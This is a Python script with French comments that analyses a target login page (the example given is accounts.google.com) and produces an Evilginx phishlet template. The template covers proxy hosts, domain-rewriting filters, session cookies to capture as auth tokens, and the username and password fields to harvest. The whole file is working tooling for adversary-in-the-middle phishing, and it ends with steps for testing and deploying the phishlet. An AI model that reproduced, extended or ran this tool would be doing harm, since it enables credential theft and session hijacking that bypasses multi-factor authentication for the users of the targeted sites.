#!/usr/bin/env python3
"""
PHISHLET ANALYZER - Outil d'analyse pour créer des phishlets Evilginx
Analyse un site web et génère un template de phishlet YAML

Usage:
    python3 phishlet_analyzer.py https://accounts.google.com

Auteur: @exemple
"""

import sys
import re
import requests
from urllib.parse import urlparse
from collections import defaultdict

def banner():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║        PHISHLET ANALYZER FOR EVILGINX                ║
    ║        Générateur de template de phishlet            ║
    ╚═══════════════════════════════════════════════════════╝
    """)

def extract_domains_from_html(html_content, base_url):
    """Extrait tous les domaines référencés dans le HTML"""
    domains = set()
    
    # Regex pour trouver les URLs
    url_pattern = r'https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
    
    matches = re.findall(url_pattern, html_content)
    for match in matches:
        domains.add(match)
    
    return sorted(domains)

def analyze_cookies(url):
    """Analyse les cookies d'un site"""
    try:
        response = requests.get(url, allow_redirects=True)
        cookies = response.cookies
        
        cookie_list = []
        for cookie in cookies:
            cookie_list.append({
                'name': cookie.name,
                'domain': cookie.domain,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('HttpOnly')
            })
        
        return cookie_list
    except Exception as e:
        print(f"[!] Erreur lors de l'analyse des cookies: {e}")
        return []

def analyze_form_fields(html_content):
    """Analyse les champs de formulaire et identifie les champs username/password"""
    # Rechercher les champs input
    input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']([^"\']+)["\'][^>]*>'
    input_pattern2 = r'<input[^>]*type=["\']([^"\']+)["\'][^>]*name=["\']([^"\']+)["\'][^>]*>'
    
    fields = []
    
    matches = re.findall(input_pattern, html_content, re.IGNORECASE)
    for name, input_type in matches:
        fields.append({'name': name, 'type': input_type})
    
    matches = re.findall(input_pattern2, html_content, re.IGNORECASE)
    for input_type, name in matches:
        fields.append({'name': name, 'type': input_type})
    
    return fields

def identify_credential_fields(form_fields):
    """Identifie intelligemment les champs username et password"""
    username_candidates = []
    password_candidates = []
    
    # Patterns communs pour username
    username_patterns = [
        'email', 'user', 'login', 'username', 'identifier', 
        'account', 'id', 'signin', 'loginfmt', 'Email'
    ]
    
    # Patterns communs pour password
    password_patterns = [
        'password', 'passwd', 'pwd', 'pass', 'Passwd'
    ]
    
    for field in form_fields:
        field_name = field['name'].lower()
        field_type = field['type'].lower()
        
        # Identifier les champs password
        if field_type == 'password' or any(pattern.lower() in field_name for pattern in password_patterns):
            password_candidates.append(field['name'])
        
        # Identifier les champs username
        if field_type in ['email', 'text', 'tel'] or any(pattern.lower() in field_name for pattern in username_patterns):
            username_candidates.append(field['name'])
    
    # Retourner le meilleur candidat ou None
    username_field = username_candidates[0] if username_candidates else None
    password_field = password_candidates[0] if password_candidates else None
    
    return username_field, password_field

def extract_auth_flow_urls(html_content, base_url):
    """Extrait les URLs du flow d'authentification (JavaScript, forms, redirects)"""
    auth_urls = set()
    parsed_base = urlparse(base_url)
    
    # Patterns d'URLs d'authentification courantes
    auth_patterns = [
        r'action=["\']([^"\']+)["\']',  # Form actions
        r'href=["\']([^"\']+(?:login|auth|signin|sign-in|oauth|sso)[^"\']*)["\']',  # Auth links
        r'location\.href\s*=\s*["\']([^"\']+)["\']',  # JavaScript redirects
        r'window\.location\s*=\s*["\']([^"\']+)["\']',  # Window location
        r'(?:login|auth|signin|sign-in|oauth).*?["\']([^"\']+)["\']',  # Generic auth URLs
    ]
    
    for pattern in auth_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            # Nettoyer et normaliser l'URL
            url = match.strip()
            if url.startswith('/'):
                auth_urls.add(url)
            elif url.startswith('http'):
                parsed = urlparse(url)
                if parsed.netloc == parsed_base.netloc:
                    auth_urls.add(parsed.path + ('?' + parsed.query if parsed.query else ''))
    
    return sorted(auth_urls)

def extract_landing_urls(html_content, base_url):
    """Extrait les URLs de redirection après login (dashboard, home, etc.)"""
    landing_urls = set()
    
    # Patterns d'URLs de landing courantes
    landing_patterns = [
        r'(?:dashboard|home|profile|account|settings|inbox|feed|timeline)',
        r'redirect_uri=["\']?([^"\'&\s]+)',
        r'return_to=["\']?([^"\'&\s]+)',
        r'next=["\']?([^"\'&\s]+)',
        r'continue=["\']?([^"\'&\s]+)',
    ]
    
    for pattern in landing_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            if isinstance(match, str) and match.startswith('/'):
                landing_urls.add(match)
    
    # URLs par défaut courantes
    default_landings = ['/dashboard', '/home', '/profile', '/feed', '/inbox']
    landing_urls.update(default_landings)
    
    return sorted(landing_urls)[:10]  # Limiter à 10

def generate_phishlet_template(target_url, domains, cookies, form_fields, html_content):
    """Génère un template de phishlet YAML"""
    
    parsed = urlparse(target_url)
    domain_parts = parsed.netloc.split('.')
    
    # Extraire le domaine principal
    if len(domain_parts) >= 2:
        main_domain = '.'.join(domain_parts[-2:])
        subdomain = '.'.join(domain_parts[:-2]) if len(domain_parts) > 2 else 'www'
    else:
        main_domain = parsed.netloc
        subdomain = 'www'
    
    # Nom du phishlet basé sur le domaine
    phishlet_name = domain_parts[-2] if len(domain_parts) >= 2 else parsed.netloc
    
    template = f"""##########################################################
# PHISHLET TEMPLATE - {phishlet_name.upper()}
# Généré automatiquement par Phishlet Analyzer
# Site cible: {target_url}
##########################################################

name: '{phishlet_name}'
author: '@votre_nom'
min_ver: '3.0.0'

##########################################################
# PROXY HOSTS
##########################################################
proxy_hosts:
  # Hôte principal
  - phish_sub: '{subdomain}'
    orig_sub: '{subdomain}'
    domain: '{main_domain}'
    session: true
    is_landing: true
    auto_filter: true

"""
    
    # Ajouter les domaines découverts
    template += "  # Domaines supplémentaires découverts:\n"
    for domain in domains[:10]:  # Limiter à 10 pour éviter trop de bruit
        if domain != parsed.netloc and main_domain in domain:
            parts = domain.split('.')
            sub = '.'.join(parts[:-2]) if len(parts) > 2 else 'www'
            template += f"""  # - phish_sub: '{sub}'
  #   orig_sub: '{sub}'
  #   domain: '{main_domain}'
  #   session: false
  #   is_landing: false
"""
    
    # Sub filters
    template += f"""
##########################################################
# SUB FILTERS
##########################################################
sub_filters:
  # Remplacer le domaine principal
  - triggers_on: '{parsed.netloc}'
    orig_sub: '{subdomain}'
    domain: '{main_domain}'
    search: '{parsed.netloc}'
    replace: '{{{{hostname}}}}'
    mimes: ['text/html', 'application/json', 'application/javascript']

  # Remplacer les URLs complètes
  - triggers_on: '{parsed.netloc}'
    orig_sub: '{subdomain}'
    domain: '{main_domain}'
    search: 'https://{parsed.netloc}'
    replace: 'https://{{{{hostname}}}}'
    mimes: ['text/html']

"""
    
    # Auth tokens (cookies)
    if cookies:
        template += """##########################################################
# AUTH TOKENS
##########################################################
auth_tokens:
"""
        # Grouper les cookies par domaine
        cookies_by_domain = defaultdict(list)
        for cookie in cookies:
            cookies_by_domain[cookie['domain']].append(cookie['name'])
        
        for domain, cookie_names in cookies_by_domain.items():
            template += f"  - domain: '{domain}'\n"
            template += f"    keys: {cookie_names}\n\n"
    
    # Credentials
    username_field, password_field = identify_credential_fields(form_fields)
    
    template += """##########################################################
# CREDENTIALS
##########################################################
credentials:
  username:
"""
    if username_field:
        template += f"    key: '{username_field}'  # Auto-détecté\n"
    else:
        template += "    key: 'email'  # ⚠️  VÉRIFIER: Aucun champ détecté automatiquement\n"
    
    template += """    search: '(.*)'
    type: 'post'
    
  password:
"""
    if password_field:
        template += f"    key: '{password_field}'  # Auto-détecté\n"
    else:
        template += "    key: 'password'  # ⚠️  VÉRIFIER: Aucun champ détecté automatiquement\n"
    
    template += """    search: '(.*)'
    type: 'post'

"""
    
    # Login configuration
    template += f"""##########################################################
# LOGIN
##########################################################
login:
  domain: '{parsed.netloc}'
  path: '{parsed.path if parsed.path else '/'}'

##########################################################
# AUTH URLS
##########################################################
"""
    
    # Extraire les URLs d'authentification
    auth_urls = extract_auth_flow_urls(html_content, target_url)
    if auth_urls:
        template += "auth_urls:\n"
        for url in auth_urls[:10]:  # Limiter à 10
            template += f"  - '{url}'\n"
    else:
        template += f"auth_urls:\n  - '{parsed.path if parsed.path else '/'}'\n"
        template += "  # ⚠️  Ajoutez manuellement les URLs du flow d'authentification\n"
        template += "  # Utilisez Chrome DevTools → Network pour les identifier\n"
    
    template += """
##########################################################
# LANDING URLS
##########################################################
"""
    
    # Extraire les URLs de landing
    landing_urls = extract_landing_urls(html_content, target_url)
    if landing_urls:
        template += "landing_urls:\n"
        for url in landing_urls:
            template += f"  - '{url}'\n"
    else:
        template += "landing_urls:\n"
        template += "  - '/dashboard'\n"
        template += "  - '/home'\n"
        template += "  # ⚠️  Ajoutez les URLs de redirection après login\n"
    
    template += """
##########################################################
# NOTES
##########################################################
# 1. Ce template est généré automatiquement et nécessite des ajustements
# 2. Vérifiez manuellement tous les champs avec les DevTools du navigateur
# 3. Testez en local avant déploiement
# 4. Analysez le trafic réseau pour identifier tous les domaines nécessaires
##########################################################
"""
    
    return template

def main():
    banner()
    
    if len(sys.argv) < 2:
        print("Usage: python3 phishlet_analyzer.py <URL>")
        print("Exemple: python3 phishlet_analyzer.py https://accounts.google.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print(f"[*] Analyse du site: {target_url}")
    
    # Récupérer le contenu HTML
    try:
        print("[*] Récupération du contenu HTML...")
        response = requests.get(target_url, allow_redirects=True, timeout=10)
        html_content = response.text
        print(f"[+] Contenu récupéré ({len(html_content)} octets)")
    except Exception as e:
        print(f"[!] Erreur lors de la récupération: {e}")
        sys.exit(1)
    
    # Extraire les domaines
    print("[*] Extraction des domaines référencés...")
    domains = extract_domains_from_html(html_content, target_url)
    print(f"[+] {len(domains)} domaines trouvés")
    for domain in domains[:10]:
        print(f"    - {domain}")
    if len(domains) > 10:
        print(f"    ... et {len(domains) - 10} autres")
    
    # Analyser les cookies
    print("[*] Analyse des cookies...")
    cookies = analyze_cookies(target_url)
    print(f"[+] {len(cookies)} cookies trouvés")
    for cookie in cookies:
        secure_flag = "[SECURE]" if cookie['secure'] else ""
        print(f"    - {cookie['name']} (domain: {cookie['domain']}) {secure_flag}")
    
    # Analyser les champs de formulaire
    print("[*] Analyse des champs de formulaire...")
    form_fields = analyze_form_fields(html_content)
    print(f"[+] {len(form_fields)} champs trouvés")
    for field in form_fields[:10]:
        print(f"    - {field['name']} (type: {field['type']})")
    
    # Générer le template
    print("\n[*] Génération du template de phishlet...")
    template = generate_phishlet_template(target_url, domains, cookies, form_fields, html_content)
    
    # Sauvegarder le template
    parsed = urlparse(target_url)
    domain_parts = parsed.netloc.split('.')
    phishlet_name = domain_parts[-2] if len(domain_parts) >= 2 else parsed.netloc
    output_file = f"{phishlet_name}-template.yaml"
    
    with open(output_file, 'w') as f:
        f.write(template)
    
    print(f"[+] Template généré: {output_file}")
    print("\n[!] IMPORTANT: Ce template nécessite des ajustements manuels !")
    print("[!] Vérifiez et testez avant utilisation en production.")
    print("\nÉtapes suivantes:")
    print(f"1. Éditer {output_file}")
    print("2. Analyser le trafic avec Chrome DevTools (F12 → Network)")
    print("3. Identifier tous les domaines/cookies/champs manquants")
    print("4. Tester en local avec Evilginx")

if __name__ == '__main__':
    main()
